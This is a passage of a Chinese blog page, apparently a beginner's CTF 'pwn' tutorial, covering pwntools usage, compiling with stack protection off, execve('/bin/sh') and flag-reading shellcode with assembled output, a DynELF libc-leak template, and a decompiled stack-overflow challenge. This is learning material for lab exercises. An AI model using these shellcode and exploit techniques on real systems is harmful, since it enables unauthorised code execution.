-          <a class="article-more-a" href="/2023/04/20/rmi%E4%B8%93%E9%A2%98/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-pwn入门" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2023/04/18/pwn%E5%85%A5%E9%97%A8/">pwn入门</a>
-    </h1>
-  
-
-        
-        <a href="/2023/04/18/pwn%E5%85%A5%E9%97%A8/" class="archive-article-date">
-  	<time datetime="2023-04-18T01:30:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-04-18</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>[toc]</p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/gd_9988/article/details/106744216">ctfshow-pwn新手系列_ctfshow pwn_Rocl5的博客-CSDN博客</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_46483584/article/details/110259127">ctfshow pwn题学习笔记_Scarehehe的博客-CSDN博客</a></p>
-<h2 id="pwn中的保护"><a href="#pwn中的保护" class="headerlink" title="pwn中的保护"></a>pwn中的保护</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44108455/article/details/104985351">pwn学习—保护机制_gclome的博客-CSDN博客</a></p>
-<p><a target="_blank" rel="noopener" href="http://yunnigu.dropsec.xyz/2016/10/08/checksec%E5%8F%8A%E5%85%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/">http://yunnigu.dropsec.xyz/2016/10/08/checksec%E5%8F%8A%E5%85%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</a></p>
-<h2 id="pwntools的使用"><a href="#pwntools的使用" class="headerlink" title="pwntools的使用"></a>pwntools的使用</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/A951860555/article/details/110990925">pwntools工具的使用（随时更新中…）___lifanxin的博客-CSDN博客</a></p>
-<p>我们本地写一个猜数游戏进行测试用来学习</p>
-<p>c：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> secretNumber, userGuess;</span><br><span class="line">    <span class="type">int</span> attempts = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化随机数生成器</span></span><br><span class="line">    srand(time(<span class="literal">NULL</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 生成一个 1 到 10000 的随机数</span></span><br><span class="line">    secretNumber = rand() % <span class="number">10000</span> + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;猜一个 1 到 10000 之间的数字。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 循环，直到用户猜到正确的数字</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;input your num:\n&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;userGuess);</span><br><span class="line">        attempts++;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (userGuess == secretNumber) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;success！\n&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;tyr %d times。\n&quot;</span>, attempts);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (userGuess &lt; secretNumber) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;low\n&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;big\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>linux：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fno-stack-protector -no-pie -m32 guessNum.c -o guessNum</span><br></pre></td></tr></table></figure>
-
-<p>在 GCC 编译器中，<code>-m32</code> 是一个编译选项，它指示编译器为 32 位目标架构生成代码。换句话说，它会告诉 GCC 生成 32 位可执行文件，而不是默认的 64 位可执行文件（假设你的系统默认是 64 位的）。</p>
-<p>当使用 <code>-m32</code> 选项编译程序时，确保已安装了 32 位库和开发工具。在某些操作系统上，可能需要额外安装这些库和工具。例如，在 Ubuntu 上，你需要安装 <code>gcc-multilib</code> 和 <code>g++-multilib</code> 包，以便在 64 位系统上编译 32 位程序。</p>
-<p>玩游戏：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">game = process(<span class="string">&#x27;./guessNum&#x27;</span>)</span><br><span class="line"></span><br><span class="line">game.recvline()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">lower_bound = <span class="number">1</span></span><br><span class="line">upper_bound = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"></span><br><span class="line">    guess = (lower_bound + upper_bound) // <span class="number">2</span></span><br><span class="line">    response = game.recvline().decode(<span class="string">&#x27;utf-8&#x27;</span>).strip()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;input&quot;</span> <span class="keyword">in</span> response:</span><br><span class="line">	game.sendline(<span class="built_in">str</span>(guess))</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;low&quot;</span> <span class="keyword">in</span> response:</span><br><span class="line">        lower_bound = guess + <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;big&quot;</span> <span class="keyword">in</span> response:</span><br><span class="line">        upper_bound = guess - <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> response:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;sucess:&quot;</span>, guess)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;error:&quot;</span>, response)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
-
-<p>结果:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~/Desktop/pwnremote$ python exp.py </span><br><span class="line">[+] Starting local process &#x27;./guessNum&#x27;: pid 3617</span><br><span class="line">(&#x27;sucess:&#x27;, 9039)</span><br><span class="line">[*] Process &#x27;./guessNum&#x27; stopped with exit code 0 (pid 3617)</span><br><span class="line">ubuntu@ubuntu:~/Desktop/pwnremote$ python exp.py </span><br><span class="line">[+] Starting local process &#x27;./guessNum&#x27;: pid 3656</span><br><span class="line">(&#x27;sucess:&#x27;, 1289)</span><br><span class="line">[*] Process &#x27;./guessNum&#x27; stopped with exit code 0 (pid 3656)</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="引入pwntools库"><a href="#引入pwntools库" class="headerlink" title="引入pwntools库"></a>引入pwntools库</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 虽然不太符合pylint代码规范</span></span><br><span class="line"><span class="comment"># 但官方也推荐这样引用</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br></pre></td></tr></table></figure>
-
-<h3 id="绑定要处理的程序"><a href="#绑定要处理的程序" class="headerlink" title="绑定要处理的程序"></a>绑定要处理的程序</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 远程</span></span><br><span class="line"><span class="comment"># remote(ip/hostname, port)</span></span><br><span class="line">p = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">8888</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 本地</span></span><br><span class="line"><span class="comment"># 注意process中参数一定要有./</span></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br></pre></td></tr></table></figure>
-
-<h3 id="设置上下文环境"><a href="#设置上下文环境" class="headerlink" title="设置上下文环境"></a>设置上下文环境</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 设置上下文环境主要用于一些需要上下文的漏洞利用</span></span><br><span class="line"><span class="comment"># 比如：shellcode的生成</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置操作系统</span></span><br><span class="line">context.os = <span class="string">&quot;linux&quot;</span></span><br><span class="line"><span class="comment"># 设置32位的体系架构 </span></span><br><span class="line">context.arch = <span class="string">&quot;i386&quot;</span></span><br><span class="line"><span class="comment"># 设置64位的体系架构</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="comment"># 打印交互中的输入和输出</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="comment"># 也可以直接这样写</span></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, lod_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 清空之前的上下文</span></span><br><span class="line">context.clear()</span><br><span class="line"><span class="comment"># 清空之前的上下文并设置为64位的体系架构</span></span><br><span class="line">context.clear(arch=<span class="string">&quot;amd64&quot;</span>)</span><br></pre></td></tr></table></figure>
-
-<h3 id="获取程序输出"><a href="#获取程序输出" class="headerlink" title="获取程序输出"></a>获取程序输出</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">p.recv()        <span class="comment"># 默认接受最大为4096字节的输出</span></span><br><span class="line">p.recvline()    <span class="comment"># 接受程序的一行输出</span></span><br><span class="line">p.recvall()     <span class="comment"># 接受程序的当前全部输出，直到遇到EOF</span></span><br><span class="line"><span class="comment"># 直到接收到\n为止，drop=True表示丢弃\n，buf为接收到的输出但不包括丢弃的\n</span></span><br><span class="line">buf = p.recvuntil(<span class="string">&quot;\n&quot;</span>, drop=<span class="literal">True</span>)   </span><br></pre></td></tr></table></figure>
-
-<h3 id="payload的构造"><a href="#payload的构造" class="headerlink" title="payload的构造"></a>payload的构造</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pad = cyclic(<span class="number">0x10</span>)</span><br><span class="line"><span class="comment"># 可以用上面的代码替代传统的构造方式 pad = b&quot;A&quot; * 0x10</span></span><br><span class="line"><span class="comment"># 其结果为 b&#x27;aaaabaaacaaadaaa&#x27;</span></span><br><span class="line">offset = cyclic_find(<span class="string">b&quot;daaa&quot;</span>)  <span class="comment"># 找到当前pad的偏移值</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="实现输入"><a href="#实现输入" class="headerlink" title="实现输入"></a>实现输入</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;hello!&#x27;</span>      <span class="comment"># python3，payload为字节类型</span></span><br><span class="line">p.sendline(payload)      <span class="comment"># 输入hello! + \n</span></span><br><span class="line">p.send(payload)          <span class="comment"># 输入hello!</span></span><br><span class="line">p.sendafter(<span class="string">&quot;test&quot;</span>, payload)      <span class="comment"># 在接受到test后才发送payload</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;test&quot;</span>, payload)  <span class="comment"># 在接受到test后才发送payload + \n</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="实现交互"><a href="#实现交互" class="headerlink" title="实现交互"></a>实现交互</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 开启和程序交互的终端</span></span><br><span class="line"><span class="comment"># 一般用于获取到shell的情况</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<h3 id="获取程序或者libc中的信息"><a href="#获取程序或者libc中的信息" class="headerlink" title="获取程序或者libc中的信息"></a>获取程序或者libc中的信息</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">pro = ELF(<span class="string">&quot;./program&quot;</span>)  <span class="comment"># 加载样本</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc&quot;</span>)    <span class="comment"># 加载libc</span></span><br><span class="line"></span><br><span class="line">read_addr = pro.symbols[<span class="string">&quot;read&quot;</span>]  <span class="comment"># 获取read函数地址</span></span><br><span class="line">read_plt = pro.plt[<span class="string">&quot;read&quot;</span>]       <span class="comment"># 获取read的plt表地址，内容等于symbols[&quot;read&quot;]</span></span><br><span class="line">read_got = pro.got[<span class="string">&quot;read&quot;</span>]       <span class="comment"># 获取read的got表地址</span></span><br><span class="line"><span class="comment"># search的参数为字节类型</span></span><br><span class="line"><span class="comment"># 获取字符串的位置</span></span><br><span class="line">str_addr = <span class="built_in">next</span>(pro.search(<span class="string">b&quot;str&quot;</span>))</span><br><span class="line"></span><br><span class="line">read_offset = libc.symbols[<span class="string">&quot;read&quot;</span>]  <span class="comment"># 获取libc中read的固定偏移值</span></span><br><span class="line">bin_sh = <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>)) <span class="comment"># 获取/bin/sh的位置</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="shellcode的生成"><a href="#shellcode的生成" class="headerlink" title="shellcode的生成"></a>shellcode的生成</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 32位的shellcode</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置上下文</span></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;i386&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">code = shellcraft.sh()  <span class="comment"># 汇编代码</span></span><br><span class="line">code = asm(code)        <span class="comment"># opcode，payload中都使用这个</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 64位的shellcode</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置上下文</span></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">code = shellcraft.sh()  <span class="comment"># 同上</span></span><br><span class="line">code = asm(code)        <span class="comment"># 同上</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 上面是执行execve(&quot;/bin/sh\x00&quot;)的shellcode</span></span><br><span class="line"><span class="comment"># 下面展示直接读取flag文件然后打印的shellcode</span></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>)</span><br><span class="line">mmap = <span class="number">0x12345678</span>  <span class="comment"># 可读可写内存区域</span></span><br><span class="line"></span><br><span class="line">code = shellcraft.<span class="built_in">open</span>(<span class="string">&quot;./flag&quot;</span>)</span><br><span class="line">code += shellcraft.read(<span class="number">3</span>, mmap, <span class="number">0x50</span>)</span><br><span class="line">code += shellcraft.write(<span class="number">1</span>, mmap, <span class="number">0x50</span>)</span><br><span class="line">code = asm(code)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 更简洁的写法</span></span><br><span class="line">code = asm(shellcraft.cat(<span class="string">&quot;flag&quot;</span>))</span><br></pre></td></tr></table></figure>
-
-<p>执行，加了print base64</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~/Desktop/pwnremote$ python exp.py </span><br><span class="line">    /* execve(path=&#x27;/bin///sh&#x27;, argv=[&#x27;sh&#x27;], envp=0) */</span><br><span class="line">    /* push &#x27;/bin///sh\x00&#x27; */</span><br><span class="line">    push 0x68</span><br><span class="line">    push 0x732f2f2f</span><br><span class="line">    push 0x6e69622f</span><br><span class="line">    mov ebx, esp</span><br><span class="line">    /* push argument array [&#x27;sh\x00&#x27;] */</span><br><span class="line">    /* push &#x27;sh\x00\x00&#x27; */</span><br><span class="line">    push 0x1010101</span><br><span class="line">    xor dword ptr [esp], 0x1016972</span><br><span class="line">    xor ecx, ecx</span><br><span class="line">    push ecx /* null terminate */</span><br><span class="line">    push 4</span><br><span class="line">    pop ecx</span><br><span class="line">    add ecx, esp</span><br><span class="line">    push ecx /* &#x27;sh\x00&#x27; */</span><br><span class="line">    mov ecx, esp</span><br><span class="line">    xor edx, edx</span><br><span class="line">    /* call execve() */</span><br><span class="line">    push SYS_execve /* 0xb */</span><br><span class="line">    pop eax</span><br><span class="line">    int 0x80</span><br><span class="line"></span><br><span class="line">[DEBUG] cpp -C -nostdinc -undef -P -I/home/ubuntu/.local/lib/python2.7/site-packages/pwnlib/data/includes /dev/stdin</span><br><span class="line">[DEBUG] Assembling</span><br><span class="line">    .section .shellcode,&quot;awx&quot;</span><br><span class="line">    .global _start</span><br><span class="line">    .global __start</span><br><span class="line">    .p2align 2</span><br><span class="line">    _start:</span><br><span class="line">    __start:</span><br><span class="line">    .intel_syntax noprefix</span><br><span class="line">        /* execve(path=&#x27;/bin///sh&#x27;, argv=[&#x27;sh&#x27;], envp=0) */</span><br><span class="line">        /* push &#x27;/bin///sh\x00&#x27; */</span><br><span class="line">        push 0x68</span><br><span class="line">        push 0x732f2f2f</span><br><span class="line">        push 0x6e69622f</span><br><span class="line">        mov ebx, esp</span><br><span class="line">        /* push argument array [&#x27;sh\x00&#x27;] */</span><br><span class="line">        /* push &#x27;sh\x00\x00&#x27; */</span><br><span class="line">        push 0x1010101</span><br><span class="line">        xor dword ptr [esp], 0x1016972</span><br><span class="line">        xor ecx, ecx</span><br><span class="line">        push ecx /* null terminate */</span><br><span class="line">        push 4</span><br><span class="line">        pop ecx</span><br><span class="line">        add ecx, esp</span><br><span class="line">        push ecx /* &#x27;sh\x00&#x27; */</span><br><span class="line">        mov ecx, esp</span><br><span class="line">        xor edx, edx</span><br><span class="line">        /* call execve() */</span><br><span class="line">        push 11 /* 0xb */</span><br><span class="line">        pop eax</span><br><span class="line">        int 0x80</span><br><span class="line">[DEBUG] /usr/bin/x86_64-linux-gnu-as -32 -o /tmp/pwn-asm-IlAesT/step2 /tmp/pwn-asm-IlAesT/step1</span><br><span class="line">[DEBUG] /usr/bin/x86_64-linux-gnu-objcopy -j .shellcode -Obinary /tmp/pwn-asm-IlAesT/step3 /tmp/pwn-asm-IlAesT/step4</span><br><span class="line">amhoLy8vc2gvYmluieNoAQEBAYE0JHJpAQExyVFqBFkB4VGJ4THSagtYzYA=</span><br></pre></td></tr></table></figure>
-
-<h3 id="DynELF泄露libc"><a href="#DynELF泄露libc" class="headerlink" title="DynELF泄露libc"></a>DynELF泄露libc</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下面展示的是DynELF的使用模板</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">pro = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">addr</span>):</span><br><span class="line">	<span class="comment"># 这里的代码比较抽象</span></span><br><span class="line">	<span class="comment"># 其实目的就是利用能够回显字符的函数泄露addr，返回地址为start</span></span><br><span class="line">	<span class="comment"># data接受的数据只能是回显的addr地址上的内容，将空字符处理为\x00</span></span><br><span class="line">	payload = padding + addr + start</span><br><span class="line">	p.send(payload)</span><br><span class="line">	data = p.recv()</span><br><span class="line">	<span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造DynELF实例，第一个参数为leak函数，第二个为题目的ELF对象</span></span><br><span class="line">d = DynELF(leak, elf=pro)</span><br><span class="line">system = d.lookup(<span class="string">&quot;system&quot;</span>, <span class="string">&quot;libc&quot;</span>)  <span class="comment"># 泄露出system的地址</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;system ====&gt; &quot;</span>, system, <span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 实战链接</span></span><br><span class="line"><span class="comment"># https://blog.csdn.net/A951860555/article/details/111638914</span></span><br><span class="line"><span class="comment"># 详细的用法讲解，包括write/puts/printf三个函数的用法和细节处理</span></span><br><span class="line"><span class="comment"># https://www.anquanke.com/post/id/85129</span></span><br></pre></td></tr></table></figure>
-
-<p>后面的不太看得懂了，先不管</p>
-<h2 id="pwn02"><a href="#pwn02" class="headerlink" title="pwn02"></a>pwn02</h2><p>main函数：</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdout, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdin, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;stack happy!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;32bits\n&quot;</span>);</span><br><span class="line">  <span class="built_in">pwnme</span>();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nExiting&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>pwnme函数：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">pwnme</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">9</span>]; <span class="comment">// [esp+Fh] [ebp-9h] BYREF</span></span><br><span class="line"></span><br><span class="line">  fgets(s, <span class="number">50</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
